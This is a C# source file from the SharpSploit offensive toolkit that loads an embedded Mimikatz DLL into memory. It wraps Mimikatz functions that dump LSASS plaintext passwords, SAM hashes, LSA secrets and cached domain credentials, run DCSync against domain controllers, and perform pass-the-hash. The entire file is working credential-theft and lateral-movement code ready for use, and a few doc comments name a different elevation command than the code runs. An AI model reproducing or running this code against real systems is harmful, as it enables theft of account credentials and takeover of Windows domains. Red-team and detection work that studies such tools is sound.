// Author: Ryan Cobb (@cobbr_io)
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

using SharpSploit.Misc;
using SharpSploit.Execution.ManualMap;

namespace SharpSploit.Credentials
{
    /// <summary>
    /// (SharpSploit.Credentials.)Mimikatz is a library for executing Mimikatz functions. SharpSploit's implementation
    /// uses a PE Loader to execute Mimikatz functions. This is a wrapper class that loads the PE and executes user-
    /// specified Mimikatz functions
    /// </summary>
    /// <remarks>
    /// Mimikatz is a tool for playing with credentials in Windows, written by Benjamin Delpy (@gentilkiwi). (Found
    /// at https://github.com/gentilkiwi/mimikatz).
    /// This wrapper class is adapted from Chris Ross (@xorrior)'s implementation, converted by (@TheRealWover) to use the Manual Mapping API.
    /// </remarks>
    public class Mimikatz
    {
        private static byte[] PEBytes32 { get; set; }
        private static byte[] PEBytes64 { get; set; }

        private static PE.PE_MANUAL_MAP MimikatzPE = new PE.PE_MANUAL_MAP();
        private static bool MappedMimikatz = false;

        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        private delegate string MimikatzType(string command);

        /// <summary>
        /// Loads the Mimikatz PE and executes a chosen Mimikatz command.
        /// </summary>
        /// <param name="Command">Mimikatz command to be executed.</param>
        /// <returns>Mimikatz output.</returns>
        public static string Command(string Command = "privilege::debug sekurlsa::logonPasswords")
        {
            string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();

            try
            {
                if (IntPtr.Size == 4 && !MappedMimikatz)
                {
                    if (PEBytes32 == null)
                    {
                        PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                        if (PEBytes32 == null) { return ""; }
                    }

                    MimikatzPE = Overload.OverloadModule(PEBytes32);
                    MappedMimikatz = true;
                }
                else if (IntPtr.Size == 8)
                {
                    if (PEBytes64 == null && !MappedMimikatz)
                    {
                        PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                        if (PEBytes64 == null) { return ""; }
                    }

                    MimikatzPE = Overload.OverloadModule(PEBytes64);
                    MappedMimikatz = true;
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }

            try
            {
                string output = "";
                Thread t = new Thread(() =>
                {
                    try
                    {
                        object[] parameters =
                        {
                            Command
                        };

                        output = (string)Execution.DynamicInvoke.Generic.CallMappedDLLModuleExport(MimikatzPE.PEINFO, MimikatzPE.ModuleBase, "powershell_reflective_mimikatz", typeof(MimikatzType), parameters);
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                    }
                });
                t.Start();
                t.Join();
                return output;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                return "";
            }
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to get some coffee.
        /// Equates to `Command("coffee")`.
        /// </summary>
        /// <returns>Mimikatz output.</returns>
        public static string Coffee()
        {
            return Command("coffee");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve plaintext
        /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
        public static string LogonPasswords()
        {
            return Command("privilege::debug sekurlsa::logonPasswords");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve password hashes
        /// from the SAM database. Equates to `Command("privilege::debug lsadump::sam")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string SamDump()
        {
            return Command("token::elevate lsadump::sam");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve LSA secrets
        /// stored in registry. Equates to `Command("privilege::debug lsadump::secrets")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string LsaSecrets()
        {
            return Command("token::elevate lsadump::secrets");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Domain
        /// Cached Credentials hashes from registry. Equates to `Command("privilege::debug lsadump::cache")`.
        /// (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string LsaCache()
        {
            return Command("token::elevate lsadump::cache");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the Mimikatz command to retrieve Wdigest
        /// credentials from registry. Equates to `Command("sekurlsa::wdigest")`.
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string Wdigest()
        {
            return Command("sekurlsa::wdigest");
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes each of the builtin local commands (not DCSync). (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
		public static string All()
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine(LogonPasswords());
            builder.AppendLine(SamDump());
            builder.AppendLine(LsaSecrets());
            builder.AppendLine(LsaCache());
            builder.AppendLine(Wdigest());
            return builder.ToString();
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the "dcsync" module to retrieve the NTLM hash of a specified (or all) Domain user. (Requires Domain Admin)
        /// </summary>
        /// <param name="user">Username to retrieve NTLM hash for. "All" for all domain users.</param>
        /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
        /// <param name="DC">Optionally specify a specific Domain Controller to target for the dcsync.</param>
        /// <returns>The NTLM hash of the target user(s).</returns>
        public static string DCSync(string user, string FQDN = null, string DC = null)
        {
            string command = "\"";
            command += "lsadump::dcsync";
            if (user.ToLower() == "all")
            {
                command += " /all";
            }
            else
            {
                command += " /user:" + user;
            }
            if (FQDN != null && FQDN != "")
            {
                command += " /domain:" + FQDN;
            }
            else
            {
                command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (DC != null && DC != "")
            {
                command += " /dc:" + DC;
            }
            command += "\"";

            return Command(command);
        }

        /// <summary>
        /// Loads the Mimikatz PE and executes the "pth" module to start a new process
        /// as a user using an NTLM password hash for authentication.
        /// </summary>
        /// <param name="user">Username to authenticate as.</param>
        /// <param name="NTLM">NTLM hash to authenticate the user.</param>
        /// <param name="FQDN">Optionally specify an alternative fully qualified domain name. Default is current domain.</param>
        /// <param name="run">The command to execute as the specified user.</param>
        /// <returns></returns>
        public static string PassTheHash(string user, string NTLM, string FQDN = null, string run = "cmd.exe")
        {
            string command = "\"";
            command += "sekurlsa::pth";
            command += " /user:" + user;
            if (FQDN != null && FQDN != "")
            {
                command += " /domain:" + FQDN;
            }
            else
            {
                command += " /domain:" + IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            command += " /ntlm:" + NTLM;
            command += " /run:" + run;
            command += "\"";
            return Command(command);
        }
    }
}
